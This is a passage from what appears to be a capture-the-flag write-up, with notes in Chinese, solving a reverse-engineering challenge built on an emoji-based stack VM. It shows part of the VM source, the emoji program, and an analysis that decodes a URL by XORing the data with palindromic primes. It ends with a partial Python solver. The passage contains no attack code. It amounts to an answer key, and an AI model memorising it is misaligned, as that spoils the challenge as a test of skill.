    sys.stdout.flush()

  def push(self):
    if self.rom[self.instruction_pointer] == '🥇':
      self.stack.append(self.accumulator1)
    elif self.rom[self.instruction_pointer] == '🥈':
      self.stack.append(self.accumulator2)
    else:
      raise RuntimeError('Unknown instruction {} at position {}'.format(
          self.rom[self.instruction_pointer], str(self.instruction_pointer)))
    self.instruction_pointer += 1

  def pop(self):
    if self.rom[self.instruction_pointer] == '🥇':
      self.accumulator1 = self.stack.pop()
    elif self.rom[self.instruction_pointer] == '🥈':
      self.accumulator2 = self.stack.pop()
    else:
      raise RuntimeError('Unknown instruction {} at position {}'.format(
          self.rom[self.instruction_pointer], str(self.instruction_pointer)))
    self.instruction_pointer += 1

  def pop_out(self):
    self.stack.pop()

  def load(self):
    num = 0

    if self.rom[self.instruction_pointer] == '🥇':
      acc = 1
    elif self.rom[self.instruction_pointer] == '🥈':
      acc = 2
    else:
      raise RuntimeError('Unknown instruction {} at position {}'.format(
          self.rom[self.instruction_pointer], str(self.instruction_pointer)))
    self.instruction_pointer += 1

    while self.rom[self.instruction_pointer] != '✋':
      num = num * 10 + (ord(self.rom[self.instruction_pointer][0]) - ord('0'))
      self.instruction_pointer += 1

    if acc == 1:
      self.accumulator1 = num
    else:
      self.accumulator2 = num

    self.instruction_pointer += 1

  def clone(self):
    self.stack.append(self.stack[-1])

  def multiply(self):
    a = self.stack.pop()
    b = self.stack.pop()
    self.stack.append(b * a)

  def divide(self):
    a = self.stack.pop()
    b = self.stack.pop()
    self.stack.append(b // a)

  def modulo(self):
    a = self.stack.pop()
    b = self.stack.pop()
    self.stack.append(b % a)

  def xor(self):
    a = self.stack.pop()
    b = self.stack.pop()
    self.stack.append(b ^ a)

  OPERATIONS = {
      '🍡': add,
      '🤡': clone,
      '📐': divide,
      '😲': if_zero,
      '😄': if_not_zero,
      '🏀': jump_to,
      '🚛': load,
      '📬': modulo,
      '⭐': multiply,
      '🍿': pop,
      '📤': pop_out,
      '🎤': print_top,
      '📥': push,
      '🔪': sub,
      '🌓': xor,
      '⛰': jump_top,
      '⌛': exit
  }


if __name__ == '__main__':
  if len(sys.argv) != 2:
    print('Missing program')
    raise SystemExit()

  with open(sys.argv[1], 'r') as f:
    print('Running ....')
    all_ins = ['']
    all_ins.extend(f.read().split())
    vm = VM(all_ins)

    while 1:
      vm.step()
```

- program

```
🚛 🥇 0️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 7️⃣ 4️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 6️⃣ 7️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 6️⃣ 5️⃣ 9️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 6️⃣ 2️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 6️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 5️⃣ 5️⃣ 0️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 5️⃣ 4️⃣ 1️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 4️⃣ 8️⃣ 3️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 4️⃣ 4️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 3️⃣ 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 3️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 3️⃣ 4️⃣ 3️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 2️⃣ 8️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 2️⃣ 7️⃣ 4️⃣ 1️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 2️⃣ 5️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 1️⃣ 5️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 1️⃣ 3️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 5️⃣ 0️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 5️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 3️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 7️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 8️⃣ 9️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 6️⃣ 6️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 7️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 2️⃣ 6️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 3️⃣ 4️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 2️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 3️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 2️⃣ 0️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 2️⃣ 1️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 2️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 7️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 7️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 4️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥈 1️⃣ ✋

🖋💠🔶🎌🚩🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 3️⃣ 8️⃣ 9️⃣ ✋
📥 🥇 📥 🥈
🏀 💰🏁🚩🎌💠🔶
🌓 🎤
🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈
😄 🏀 💰💠🔶🎌🚩🏁 😐

🚛 🥇 9️⃣ 8️⃣ 4️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 7️⃣ 8️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 7️⃣ 6️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 7️⃣ 2️⃣ 8️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 6️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 6️⃣ 4️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 6️⃣ 3️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 5️⃣ 9️⃣ 3️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 4️⃣ 8️⃣ 6️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 4️⃣ 9️⃣ 5️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 4️⃣ 6️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 4️⃣ 4️⃣ 4️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 3️⃣ 9️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 3️⃣ 7️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥈 9️⃣ 9️⃣ ✋

🖋💠🏁🎌🔶🚩 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 5️⃣ 6️⃣ 8️⃣ ✋
📥 🥇 📥 🥈
🏀 💰🏁🚩🎌💠🔶
🌓 🎤
🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈
😄 🏀 💰💠🏁🎌🔶🚩 😐

🚛 🥇 1️⃣ 0️⃣ 1️⃣ 1️⃣ 4️⃣ 1️⃣ 0️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 6️⃣ 0️⃣ 2️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 5️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 9️⃣ 9️⃣ 8️⃣ 9️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 8️⃣ 8️⃣ 7️⃣ 9️⃣ 9️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 6️⃣ 7️⃣ 0️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 0️⃣ 7️⃣ 0️⃣ 3️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 6️⃣ 5️⃣ 6️⃣ 1️⃣ 1️⃣ 1️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 4️⃣ 0️⃣ 4️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 6️⃣ 0️⃣ 9️⃣ 2️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 3️⃣ 1️⃣ 0️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 1️⃣ 1️⃣ 1️⃣ 0️⃣ 0️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 5️⃣ 9️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 4️⃣ 9️⃣ 9️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 4️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 8️⃣ 9️⃣ 9️⃣ 9️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 8️⃣ 1️⃣ 8️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 8️⃣ 0️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 7️⃣ 8️⃣ 8️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 6️⃣ 5️⃣ 7️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 5️⃣ 7️⃣ 5️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 3️⃣ 8️⃣ 3️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 3️⃣ 5️⃣ 4️⃣ 2️⃣ 7️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 3️⃣ 2️⃣ 2️⃣ 8️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 3️⃣ 1️⃣ 4️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 2️⃣ 7️⃣ 3️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 2️⃣ 6️⃣ 3️⃣ 7️⃣ 6️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 2️⃣ 3️⃣ 2️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 2️⃣ 1️⃣ 3️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 1️⃣ 9️⃣ 1️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 1️⃣ 8️⃣ 0️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇
🚛 🥇 9️⃣ 9️⃣ 1️⃣ 6️⃣ 2️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇
🚛 🥈 7️⃣ 6️⃣ 5️⃣ ✋

🖋🚩💠🎌🔶🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 1️⃣ 0️⃣ 2️⃣ 3️⃣ ✋
📥 🥇 📥 🥈
🏀 💰🏁🚩🎌💠🔶
🌓 🎤
🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈
😄 🏀 💰🚩💠🎌🔶🏁 😐
⌛

🖋🏁🚩🎌💠🔶
🚛 🥇 2️⃣ ✋ 📥 🥇 🖋💠🎌🏁🚩🔶
🏀 💰🚩🔶🏁🎌💠
🖋🔶🎌🚩💠🏁 😲 📤 🏀 💰🔶🚩💠🏁🎌 ✋ 😐
📤 🏀 💰🎌🏁💠🔶🚩
🖋🎌🏁🚩🔶💠 😲 📤 🏀 💰🔶🚩💠🏁🎌 😐
📤 🍿 🥇 🚛 🥈 1️⃣ ✋ 📥 🥈 🔪
😲 📤 🍿 🥈 📥 🥇 📥 🥈 ⛰ 😐 📥 🥇
🖋🔶🚩💠🏁🎌 🚛 🥈 1️⃣ ✋ 📥 🥈 🍡 🏀 💰💠🎌🏁🚩🔶

🖋🚩🔶🏁🎌💠
🤡 🚛 🥇 2️⃣ ✋ 📥 🥇
🖋🎌🚩💠🔶🏁 🔪 😲 📤 🚛 🥇 1️⃣ ✋ 📥 🥇
🏀 💰🔶🎌🚩💠🏁 😐
📤 🤡 📥 🥇
📬 😲 🏀 💰🔶🎌🚩💠🏁 😐
📤 🤡 📥 🥇 🚛 🥇 1️⃣ ✋
📥 🥇 🍡 🤡 🍿 🥇 🏀 💰🎌🚩💠🔶🏁

🖋🎌🏁💠🔶🚩
🤡 🤡 🚛 🥈 0️⃣ ✋ 📥 🥈
🖋🏁💠🔶🚩🎌 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇
⭐ 🍿 🥈 📥 🥇 📬
📥 🥈 🍡 🍿 🥈 🍿 🥇 🤡 📥 🥈 🔪
😲 📤 🚛 🥈 1️⃣ ✋ 📥 🥈 🏀 💰🎌🏁🚩🔶💠 😐
📤 📥 🥇 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇 📐
😲 🏀 💰🎌🏁🚩🔶💠 😐
🤡 📥 🥈 🏀 💰🏁💠🔶🚩🎌
```

- 尝试使用vm.py将program 转换成代码形式，速度太慢，应该是一个错误的思路

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com
╰─➤  python3 vm.py program
Running ....
http://emoji-t0anaxnr3nacpt4n
```

- 分析vm.py,实现了基于堆栈的相关算法。
- 分析得到rom为输入数据，从program中获取，分为3段

```txt
[0，1️7️4️8️8️, 1️6️7️5️8️, 1️6️5️9️9️, 1️6️2️8️5️, 1️6️0️9️4️, 1️5️5️0️5️, 1️5️4️1️7️, 1️4️8️3️2️, 1️4️4️5️0️, 1️3️8️9️3️, 1️3️9️2️6️, 1️3️4️3️7️, 1️2️8️3️3️, 1️2️7️4️1️, 1️2️5️3️3️, 1️1️5️0️4️, 1️1️3️4️2️, 1️0️5️0️3️, 1️0️5️5️0️, 1️0️3️1️9️, 9️7️5️, 1️0️0️7️, 8️9️2️, 8️9️3️, 6️6️0️, 7️4️3️, 2️6️7️, 3️4️4️, 2️6️4️, 3️3️9️, 2️0️8️, 2️1️6️, 2️4️2️, 1️7️2, 7️4, 4️9️, 1️1️9️, 1️1️3️, 1️1️9️, 1️06, 1️ ]

[9️8️4️2️6️, 9️7️8️5️0️, 9️7️6️0️4️, 9️7️2️8️0️, 9️6️8️1️5️, 9️6️4️4️3️, 9️6️3️5️4️, 9️5️9️3️4️, 9️4️8️6️5️, 9️4️9️5️2️, 9️4️6️6️9️, 9️4️4️4️0️, 9️3️9️6️9️, 9️3️7️6️6, 9️9]

[1️0️1️1️4️1️0️5️8️, 1️0️1️0️6️0️2️0️6️, 1️0️1️0️3️0️0️5️5️, 1️0️0️9️9️8️9️6️6️, 1️0️0️8️8️7️9️9️0️, 1️0️0️7️6️7️0️8️5️, 1️0️0️7️0️7️0️3️6️, 1️0️0️6️5️6️1️1️1️, 1️0️0️4️0️4️0️9️4️, 1️0️0️1️6️0️9️2️2️, 1️0️0️1️3️1️0️1️9️, 1️0️0️1️1️1️1️0️0️, 1️0️0️0️5️9️9️2️6️, 1️0️0️0️4️9️9️8️2️, 1️0️0️0️3️0️0️4️5️, 9️9️8️9️9️9️7️, 9️9️8️1️8️5️8️, 9️9️8️0️8️1️5️, 9️9️7️8️8️4️2️, 9️9️6️5️7️9️4️, 9️9️5️7️5️6️4️, 9️9️3️8️3️0️4️, 9️9️3️5️4️2️7️, 9️9️3️2️2️8️9️, 9️9️3️1️4️9️4️, 9️9️2️7️3️8️8️, 9️9️2️6️3️7️6️, 9️9️2️3️2️1️3️, 9️9️2️1️3️9️4️, 9️9️1️9️1️5️4️, 9️9️1️8️0️8️2️, 9️9️1️6️2️3️9️, 7️6️5️]
```

- 通过答应vm.print_top()可以看到输出结果是连个数字xor,转为chr，与初始执行得到的的```http://...```一致，对打印结果进行整理

```txt
in: 106         key: 2          chr: 104        out: h
in: 119         key: 3          chr: 116        out: t
in: 113         key: 5          chr: 116        out: t
in: 119         key: 7          chr: 112        out: p
in: 49          key: 11         chr: 58         out: :
in: 74          key: 101        chr: 47         out: /
in: 172         key: 131        chr: 47         out: /
in: 242         key: 151        chr: 101        out: e
in: 216         key: 181        chr: 109        out: m
in: 208         key: 191        chr: 111        out: o
in: 339         key: 313        chr: 106        out: j
in: 264         key: 353        chr: 105        out: i
in: 344         key: 373        chr: 45         out: -
in: 267         key: 383        chr: 116        out: t
in: 743         key: 727        chr: 48         out: 0
in: 660         key: 757        chr: 97         out: a
in: 893         key: 787        chr: 110        out: n
in: 892         key: 797        chr: 97         out: a
in: 1007        key: 919        chr: 120        out: x
in: 975         key: 929        chr: 110        out: n
in: 10319       key: 10301      chr: 114        out: r
in: 10550       key: 10501      chr: 51         out: 3
in: 10504       key: 10601      chr: 97         out: a
in: 11342       key: 11311      chr: 97         out: a
in: 11503       key: 11411      chr: 124        out: |
in: 12533       key: 12421      chr: 112        out: p
in: 12741       key: 12721      chr: 116        out: t
in: 12833       key: 12821      chr: 52         out: 4
```

- 分析看到key为回文数，通过google,在<https://oeis.org/>找到序列标记为A002385
- 输入list 的最后一个数字表示，从第几个回文数开始计算
- 编写脚本将program中的输入与A002385中的数xor

```python
primes = [2, 3, 5, 7, 11, 101, 131, 151, 181, 191, 313, 353, 373, 383, 727, 757, 787, 797, 919, 929, 10301, 10501, 10601, 11311, 11411, 12421, 12721, 12821, 13331, 13831, 13931, 14341, 14741, 15451, 15551, 16061, 16361, 16561, 16661, 17471, 17971, 18181, 18481, 19391, 19891, 19991, 30103, 30203, 30403, 30703, 30803, 31013, 31513, 32323, 32423, 33533, 34543, 34843, 35053, 35153, 35353, 35753, 36263, 36563, 37273, 37573, 38083, 38183, 38783, 39293, 70207, 70507, 70607, 71317, 71917, 72227, 72727, 73037, 73237, 73637, 74047, 74747, 75557, 76367, 76667, 77377, 77477, 77977, 78487, 78787, 78887, 79397, 79697, 79997, 90709, 91019, 93139, 93239, 93739, 94049, 94349, 94649, 94849, 94949, 95959, 96269, 96469, 96769, 97379, 97579, 97879, 98389, 98689, 1003001, 1008001, 1022201, 1028201, 1035301, 1043401, 1055501, 1062601, 1065601, 1074701, 1082801, 1085801, 1092901, 1093901, 1114111, 1117111, 1120211, 1123211, 1126211, 1129211, 1134311, 1145411, 1150511, 1153511, 1160611, 1163611, 1175711, 1177711, 1178711, 1180811, 1183811, 1186811, 1190911, 1193911, 1196911, 1201021, 1208021, 1212121, 1215121, 1218121, 1221221, 1235321, 1242421, 1243421, 1245421, 1250521, 1253521, 1257521, 1262621, 1268621, 1273721, 1276721, 1278721, 1280821, 1281821, 1286821, 1287821, 1300031, 1303031, 1311131, 1317131, 1327231, 1328231, 1333331, 1335331, 1338331, 1343431, 1360631, 1362631, 1363631, 1371731, 1374731, 1390931, 1407041, 1409041, 1411141, 1412141, 1422241, 1437341, 1444441, 1447441, 1452541, 1456541, 1461641, 1463641, 1464641, 1469641, 1486841, 1489841, 1490941, 1496941, 1508051, 1513151, 1520251, 1532351, 1535351, 1542451, 1548451, 1550551, 1551551, 1556551, 1557551, 1565651, 1572751, 1579751, 1580851, 1583851, 1589851, 1594951, 1597951, 1598951, 1600061, 1609061, 1611161, 1616161, 1628261, 1630361, 1633361, 1640461, 1643461, 1646461, 1654561, 1657561, 1658561, 1660661, 1670761, 1684861, 1685861, 1688861, 1695961, 1703071, 1707071, 1712171, 1714171, 1730371, 1734371, 1737371, 1748471, 1755571, 1761671, 1764671, 1777771, 1793971, 1802081, 1805081, 1820281, 1823281, 1824281, 1826281, 1829281, 1831381, 1832381, 1842481, 1851581, 1853581, 1856581, 1865681, 1876781, 1878781, 1879781, 1880881, 1881881, 1883881, 1884881, 1895981, 1903091, 1908091, 1909091, 1917191, 1924291, 1930391, 1936391, 1941491, 1951591, 1952591, 1957591, 1958591, 1963691, 1968691, 1969691, 1970791, 1976791, 1981891, 1982891, 1984891, 1987891, 1988891, 1993991, 1995991, 1998991, 3001003, 3002003, 3007003, 3016103, 3026203, 3064603, 3065603, 3072703, 3073703, 3075703, 3083803, 3089803, 3091903, 3095903, 3103013, 3106013, 3127213, 3135313, 3140413, 3155513, 3158513, 3160613, 3166613, 3181813, 3187813, 3193913, 3196913, 3198913, 3211123, 3212123, 3218123, 3222223, 3223223, 3228223, 3233323, 3236323, 3241423, 3245423, 3252523, 3256523, 3258523, 3260623, 3267623, 3272723, 3283823, 3285823, 3286823, 3288823, 3291923, 3293923, 3304033, 3305033, 3307033, 3310133, 3315133, 3319133, 3321233, 3329233, 3331333, 3337333, 3343433, 3353533, 3362633, 3364633, 3365633, 3368633, 3380833, 3391933, 3392933, 3400043, 3411143, 3417143, 3424243, 3425243, 3427243, 3439343, 3441443, 3443443, 3444443, 3447443, 3449443, 3452543, 3460643, 3466643, 3470743, 3479743, 3485843, 3487843, 3503053, 3515153, 3517153, 3528253, 3541453, 3553553, 3558553, 3563653, 3569653, 3586853, 3589853, 3590953, 3591953, 3594953, 3601063, 3607063, 3618163, 3621263, 3627263, 3635363, 3643463, 3646463, 3670763, 3673763, 3680863, 3689863, 3698963, 3708073, 3709073, 3716173, 3717173, 3721273, 3722273, 3728273, 3732373, 3743473, 3746473, 3762673, 3763673, 3765673, 3768673, 3769673, 3773773, 3774773, 3781873, 3784873, 3792973, 3793973, 3799973, 3804083, 3806083, 3812183, 3814183, 3826283, 3829283, 3836383, 3842483, 3853583, 3858583, 3863683, 3864683, 3867683, 3869683, 3871783, 3878783, 3893983, 3899983, 3913193, 3916193, 3918193, 3924293, 3927293, 3931393, 3938393, 3942493, 3946493, 3948493, 3964693, 3970793, 3983893, 3991993, 3994993, 3997993, 3998993, 7014107, 7035307, 7036307, 7041407, 7046407, 7057507, 7065607, 7069607, 7073707, 7079707, 7082807, 7084807, 7087807, 7093907, 7096907, 7100017, 7114117, 7115117, 7118117, 7129217, 7134317, 7136317, 7141417, 7145417, 7155517, 7156517, 7158517, 7159517, 7177717, 7190917, 7194917, 7215127, 7226227, 7246427, 7249427, 7250527, 7256527, 7257527, 7261627, 7267627, 7276727, 7278727, 7291927, 7300037, 7302037, 7310137, 7314137, 7324237, 7327237, 7347437, 7352537, 7354537, 7362637, 7365637, 7381837, 7388837, 7392937, 7401047, 7403047, 7409047, 7415147, 7434347, 7436347, 7439347, 7452547, 7461647, 7466647, 7472747, 7475747, 7485847, 7486847, 7489847, 7493947, 7507057, 7508057, 7518157, 7519157, 7521257, 7527257, 7540457, 7562657, 7564657, 7576757, 7586857, 7592957, 7594957, 7600067, 7611167, 7619167, 7622267, 7630367, 7632367, 7644467, 7654567, 7662667, 7665667, 7666667, 7668667, 7669667, 7674767, 7681867, 7690967, 7693967, 7696967, 7715177, 7718177, 7722277, 7729277, 7733377, 7742477, 7747477, 7750577, 7758577, 7764677, 7772777, 7774777, 7778777, 7782877, 7783877, 7791977, 7794977, 7807087, 7819187, 7820287, 7821287, 7831387, 7832387, 7838387, 7843487, 7850587, 7856587, 7865687, 7867687, 7868687, 7873787, 7884887, 7891987, 7897987, 7913197, 7916197, 7930397, 7933397, 7935397, 7938397, 7941497, 7943497, 7949497, 7957597, 7958597, 7960697, 7977797, 7984897, 7985897, 7987897, 7996997, 9002009, 9015109, 9024209, 9037309, 9042409, 9043409, 9045409, 9046409, 9049409, 9067609, 9073709, 9076709, 9078709, 9091909, 9095909, 9103019, 9109019, 9110119, 9127219, 9128219, 9136319, 9149419, 9169619, 9173719, 9174719, 9179719, 9185819, 9196919, 9199919, 9200029, 9209029, 9212129, 9217129, 9222229, 9223229, 9230329, 9231329, 9255529, 9269629, 9271729, 9277729, 9280829, 9286829, 9289829, 9318139, 9320239, 9324239, 9329239, 9332339, 9338339, 9351539, 9357539, 9375739, 9384839, 9397939, 9400049, 9414149, 9419149, 9433349, 9439349, 9440449, 9446449, 9451549, 9470749, 9477749, 9492949, 9493949, 9495949, 9504059, 9514159, 9526259, 9529259, 9547459, 9556559, 9558559, 9561659, 9577759, 9583859, 9585859, 9586859, 9601069, 9602069, 9604069, 9610169, 9620269, 9624269, 9626269, 9632369, 9634369, 9645469, 9650569, 9657569, 9670769, 9686869, 9700079, 9709079, 9711179, 9714179, 9724279, 9727279, 9732379, 9733379, 9743479, 9749479, 9752579, 9754579, 9758579, 9762679, 9770779, 9776779, 9779779, 9781879, 9782879, 9787879, 9788879, 9795979, 9801089, 9807089, 9809089, 9817189, 9818189, 9820289, 9822289, 9836389, 9837389, 9845489, 9852589, 9871789, 9888889, 9889889, 9896989, 9902099, 9907099, 9908099, 9916199, 9918199, 9919199, 9921299, 9923299, 9926299, 9927299, 9931399, 9932399, 9935399, 9938399, 9957599, 9965699, 9978799, 9980899, 9981899, 9989899, 100030001, 100050001, 100060001, 100111001, 100131001, 100161001, 100404001, 100656001, 100707001, 100767001, 100888001, 100999001, 101030101, 101060101, 101141101, 101171101, 101282101, 101292101, 101343101, 101373101, 101414101, 101424101, 101474101, 101595101, 101616101, 101717101, 101777101, 101838101, 101898101, 101919101, 101949101, 101999101, 102040201, 102070201, 102202201, 102232201, 102272201, 102343201, 102383201, 102454201, 102484201, 102515201, 102676201, 102686201, 102707201, 102808201, 102838201, 103000301, 103060301, 103161301, 103212301, 103282301, 103303301, 103323301, 103333301, 103363301, 103464301, 103515301, 103575301, 103696301, 103777301, 103818301, 103828301, 103909301, 103939301, 104000401, 104030401, 104040401, 104111401, 104222401, 104282401, 104333401, 104585401, 104616401, 104787401, 104838401, 104919401, 104949401, 105121501, 105191501, 105202501, 105262501, 105272501, 105313501, 105323501, 105343501, 105575501, 105616501, 105656501, 105757501, 105818501, 105868501, 105929501, 106060601, 106111601, 106131601, 106191601, 106222601, 106272601, 106353601, 106444601, 106464601, 106545601, 106555601, 106717601, 106909601, 106929601, 107000701, 107070701, 107121701, 107232701, 107393701, 107414701, 107424701, 107595701, 107636701, 107646701, 107747701, 107757701, 107828701, 107858701, 107868701, 107888701, 107939701, 107949701, 108070801, 108101801, 108121801, 108151801, 108212801, 108323801, 108373801, 108383801, 108434801, 108464801, 108484801, 108494801, 108505801, 108565801, 108686801, 108707801, 108767801, 108838801, 108919801, 108959801, 109000901, 109101901, 109111901, 109161901, 109333901, 109404901, 109434901, 109444901, 109474901, 109575901, 109656901, 109747901, 109777901, 109797901, 109818901, 109909901];

part1 = [17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 49, 119, 113, 119, 106][::-1];

part2 = [98426, 97850, 97604, 97280, 96815, 96443, 96354, 95934, 94865, 94952, 94669, 94440, 93969, 93766][::-1]


part3 = [101141058, 101060206, 101030055, 100998966, 100887990, 100767085, 100707036, 100656111, 100404094, 100160922, 100131019, 100111100, 100059926, 100049982, 100030045, 9989997, 9981858, 9980815, 9978842, 9965794, 9957564, 9938304, 9935427, 9932289, 9931494, 9927388, 9926376, 9923213, 9921394, 9919154, 9918082, 9916239][::-1]

k1 = 0
k2 =98
k3 =764

for i in range(0,len(part1)):

    ans = chr(part1[i] ^ primes[k1])
    print(ans,end="")
    k1 += 1

for i in range(0,len(part2)):

    ans = chr(part2[i] ^ primes[k2])
    print(ans,end="")
    k2 += 1

for i in range(0,len(part3)):

